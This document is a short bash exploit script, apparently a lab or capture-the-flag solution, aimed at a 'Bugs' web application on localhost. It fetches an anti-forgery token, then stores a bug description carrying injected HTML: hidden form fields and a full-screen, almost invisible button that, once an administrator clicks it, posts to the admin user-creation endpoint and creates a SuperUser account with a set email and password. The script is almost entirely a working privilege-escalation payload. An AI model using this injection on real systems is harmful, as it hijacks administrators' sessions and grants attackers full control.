#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "USAGE: $0 <cookieJar>"
    exit 1
fi

rhost="http://localhost"
cookieJar=$1

xsrf_token=$(curl -s -b $cookieJar "$rhost/Bugs/Details?name=Off%20by%20One%20Bug" | htmlq 'input[name=xsrf_token]' -a value)

curl -s -i -b $cookieJar \
    --data-binary $'Bug.Name=Off%20by%20One%20Bug&Bug.Description=WHATEVER\">\x0d\x0a<style>.modal+.modal-content.is-normal{width%3a100%25%3bheight%3a100%25%3b}.modal-card-head{width%3a50%25%3bmargin-top%3a5%25%3bleft%3a25%25%3b}.modal-card-body{width%3a50%25%3bheight%3a50%25%3bmargin-top%3a0%25%3bmargin-left%3a25%25%3b}</style>\x0d\x0a<div+style%3d\"position%3aabsolute%3btop%3a0px%3bleft%3a0px%3bz-index%3a+41%3b\">\x0d\x0a<input+hidden+name%3d\"Data%26period%3bEmail\"+value%3d\"gg%40bugznet%26period%3bcom\">\x0d\x0a<input+hidden+name%3d\"Data%26period%3bRole\"+value%3d\"SuperUser\">\x0d\x0a<input+hidden+name%3d\"Data%26period%3bPassword\"+value%3d\"12345678\">\x0d\x0a<input+hidden+name%3d\"Data%26period%3bConfirmationPassword\"+value%3d\"12345678\">\x0d\x0a<iframe+name%3d\"blackhole\"+src%3d\"about%3ablank\"+style%3d\"display%3a+none\"></iframe>\x0d\x0a<button+type%3d\"submit\"+formtarget%3d\"blackhole\"+formaction%3d\"/Admin/Users/CreateEdit%3fhandler%3dcreate\"+style%3d\"position%3arelative%3bwidth%3a+1920px%3bheight%3a+1080px%3bopacity%3a+0%26period%3b001%3bz-index%3a999999%3b\"></button>\x0d\x0a</div>\x0d\x0a<x+x%3d\"&Bug.Bites=true&Bug.CanFly=false&Bug.Bites=false' \
    --data-urlencode "xsrf_token=$xsrf_token" \
    "$rhost/Bugs/Details?name=Off%20by%20One%20Bug" 

echo "Now we wait for admin to trigger the Injection"
echo "Once triggered the user gg@bugznet.com with pass 12345678 will be created"